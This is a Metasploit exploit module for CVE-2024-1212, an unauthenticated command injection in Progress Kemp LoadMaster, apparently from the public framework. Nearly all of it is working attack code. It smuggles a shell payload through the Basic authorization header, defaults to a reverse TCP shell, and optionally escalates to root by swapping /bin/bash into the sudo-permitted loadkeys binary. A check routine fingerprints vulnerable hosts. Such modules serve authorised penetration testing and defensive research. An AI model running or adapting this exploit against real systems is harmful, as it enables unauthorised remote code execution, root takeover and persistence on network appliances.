##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kemp LoadMaster Unauthenticated Command Injection',
        'Description' => %q{
          This module exploits an unauthenticated command injection vulnerability in
          Progress Kemp LoadMaster in the authroization header.
        },
        'Author' => [
          'Dave Yesland with Rhino Security Labs',
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-1212'],
          ['URL', 'https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/'],
          ['URL', 'https://kemptechnologies.com/kemp-load-balancers']
        ],
        'DisclosureDate' => '2024-03-19',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'Privileged' => false,
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/linux/https/x64/shell/reverse_tcp',
          'SSL' => true,
          'RPORT' => 443
        },
        'Payload' => {
          'BadChars' => "\x3a\x27"
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The URI path to LoadMaster', '/']),
      OptString.new('FLAG_FILE', [true, 'Run once flag file', '/tmp/test8675309']),
      OptBool.new('PRIVESC', [true, 'Automatically try privesc to add sudo entry', true])
    ])

    @first_session_timestamp = nil
  end

  def add_runonce
    runonce_preamble = "[ -f #{datastore['FLAG_FILE']} ] || ( touch #{datastore['FLAG_FILE']}; "
    payload.raw.insert(0, runonce_preamble)
    payload.raw << ')'
  end

  def add_privesc
    # assigning a value to payload.raw is not allowed, but you can modify it in place ¯\_(ツ)_/¯
    insert_index = payload.raw.to_s.to_enum(:scan, /;/).map { Regexp.last_match }[1].offset(0)[1]
    priv_esc_string = ' sudo /bin/cp /bin/loadkeys /tmp/loadkeys;'
    priv_esc_string << ' sudo /bin/cp /bin/bash /bin/loadkeys;' # chmod command
    priv_esc_string << ' sudo /bin/loadkeys -c ' # chmod command
    payload.raw.insert(insert_index, priv_esc_string)
    payload.raw << 'sudo /bin/cp /tmp/loadkeys /bin/loadkeys;'
  end

  def exploit
    uri = normalize_uri(target_uri.path, 'access', 'set')

    print_status('Sending payload...')

    add_privesc if datastore['PRIVESC']
    add_runonce

    send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'vars_get' =>
        {
          'param' => 'enableapi',
          'value' => '1'
        },
      'authorization' => basic_auth("';#{payload.encode};echo '", 'anything'),
      'verify' => false
    })
  end

  def check
    print_status("Checking if #{peer} is vulnerable...")

    uri = normalize_uri(target_uri.path, 'access', 'set')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'vars_get' => {
        'param' => 'enableapi',
        'value' => '1'
      },
      'authorization' => basic_auth("'", 'anything'),
      'verify' => false
    })

    # No response from server
    unless res
      return CheckCode::Unknown
    end

    # Check for specific error pattern in headers or body to confirm vulnerability
    if res.headers.to_s.include?('unexpected EOF while looking for matching') || res.body.include?('unexpected EOF while looking for matching')
      return CheckCode::Vulnerable
    else
      return CheckCode::Safe
    end
  end

end
